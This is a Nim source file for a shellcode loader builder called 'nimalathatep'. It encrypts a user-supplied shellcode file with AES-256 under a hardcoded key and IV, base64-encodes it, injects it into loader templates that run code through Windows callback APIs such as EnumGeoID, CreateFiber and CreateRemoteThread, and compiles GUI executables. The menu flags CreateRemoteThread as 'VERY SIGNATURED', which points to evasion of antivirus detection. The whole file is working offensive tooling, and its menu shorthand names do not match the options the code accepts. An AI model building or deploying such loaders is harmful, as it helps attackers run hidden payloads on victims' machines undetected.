import winim/lean
import os
import base64
import nimcrypto
import strutils




let banner = """
 ______ __  __  ____      ___ ____   ___  __    __ __    __ __  __   ___       ___ __  __  ___    ___    __ 
 | || | ||  || ||        //   || \\ // \\ ||    || ||    || ||\ ||  // \\     //   ||  || // \\  // \\  (( \
   ||   ||==|| ||==     ((    ||_// ||=|| \\ /\ // ||    || ||\\|| (( ___    ((    ||==|| ||=|| ((   ))  \\ 
   ||   ||  || ||___     \\__ || \\ || ||  \V/\V/  ||__| || || \||  \\_||     \\__ ||  || || ||  \\_//  \_))
                                                                                                            
        
                                                                ,* .,  ,., .                        
                                                           .**((((.        ,(%(//,                  
                                                           ,((((,     */      ,(((/.. .             
               ,/((((*      *(((/,,                         .*/*,              ,**,.                
           ..*(/#(              /(#(*,                          ./,.         ....                   
            .,/*/,              ,((/*,.                                                             
              .(//             .*,..                                                                
                    ..     ..                                                                       
                                                                                                    
                                                                                                    
                                      ,#(((////*//((*,.                       *(#(/*/,**/(/(*,.     
,* .*  **,,,,.                     *//#((/.          /##/(/.               ,*/#(##/         ./#(/(*.
#/.        ,##((*,*              .,/(##(               .(###*,            .*(#(((               /#((
              /###*,,             ..*/**       .        ,/*/*,.             ./*//                ,//
              ,((***,.               *//*               ,/,..                 ,*//,              *.,
             .,***.                      .,*.       ....                           ,,,        ,,... 
           .....                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                      .*.  ,   .. ,,.               
     ./#(#((((/,*/(/((/*,.                                        .*((((##/.      ,(#///,           
  ,*//#/((/           ,(#(///*,                                ..//(/(**             ./#((//*.      
 ,*((#((.                (####/..                              .,/(((#*                 *#((((,,    
 ,*//(/.      .          ,(/(***..                               ,*//(*                  */(*(*,,.  
  ,//,*.                 .***/** .                                .*//*,                 ,**/* .    
   .(//*                 ..,,.                                       ,///               .,...       
      .,,*.          ...,..                                               ,,,.       ., .           
               .                                                                                    
                                                                                                    
  
             ...quivering and afraid, into the sightless vortex of the unimaginable.

         
"""
echo banner
echo "\n\n"

echo "Usage: \n nimalathatep.exe <apiMethod> <binFile>\n\n\n\n"
echo "Methods currently available:\n"
echo "EnumGeoID [enumgeoid]\n"
echo "CreateFiber [createfiber]\n"
echo "CreateRemoteThread [createremotethread] <--VERY SIGNATURED\n"
echo "CreateThreadpoolWait [reatehreadpoolait]\n"
echo "EnumLanguageGroupLocales [enumlanguageg]\n"
echo "CryptEnumOIDInfo [cryptenum]\n"
echo "EnumDisplayMonitors [enumdisplay]\n"
echo "CertEnumSystemStore [enumsystemstore]\n"
echo "EnumDesktopWindows [enumdesktop]\n"







proc main() = 
    let #get args
        apiMethod: string = paramStr(1)
        binFile: string = paramStr(2)


    #read the file
    var file: File
    file = open(binFile, fmRead)
    var fileSize = file.getFileSize()
    var plaintext = newSeq[byte] (fileSize)
    discard file.readBytes(plaintext, 0, fileSize) #ignore the return value


 
    var
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #why it be like this :( 
    var password: string = "ReallyReallyLongAndComplicatedPasswordThatReallyDoesntEvenNeedToBeThatCrazyTbhBecauseWhoIsGonnaReverseItAndTheyWouldntEvenNeedThePassword"
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

        
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()
        
    # Base64 encode encrypted shellcode
    let encodedCrypted = encode(encrypted)

    echo "Encrypting and encoding payload. May your efforts be fruitful.\n"


    if apiMethod == "enumgeoid": 
        let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoID.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) #current issue! If you need to remake payload, you need to put the placeholder BACK into the file. Only takes a second but is annoying...
        discard execShellCmd("nim -d:release --out:EnumGeoID.exe --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")

    elif apiMethod == "createfiber": 
        let file_path = ".\\apiMethods\\CreateFiber\\CreateFiber.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:CreateFiber.exe --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")

    elif apiMethod == "createremotethread": 
        let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:CreateRemoteThread.exe --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")

    elif apiMethod == "createthreadpoolwait": 
        let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.exe --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")

    elif apiMethod == "enumlanguage": 
        let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.exe --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")

    elif apiMethod == "cryptenum": 
        let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.exe --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")

    elif apiMethod == "enumdisplay": 
        let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.exe --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")

    elif apiMethod == "enumsystemstore": 
        let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:CertEnumSystemStore.exe --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")

    elif apiMethod == "enumdesktop": 
        let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        discard execShellCmd("nim -d:release --out:EnumDesktopWindows.exe --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")

    #elif    
    else:
        echo "Error, didn't run API call compilation."






#catch all
when defined(windows):
    if 1>0:
        if paramCount() == 2:
            main()
        else: 
            echo "Usage: \n nimalathatep.exe <apiMethod> <binFile> \n\n\n\n"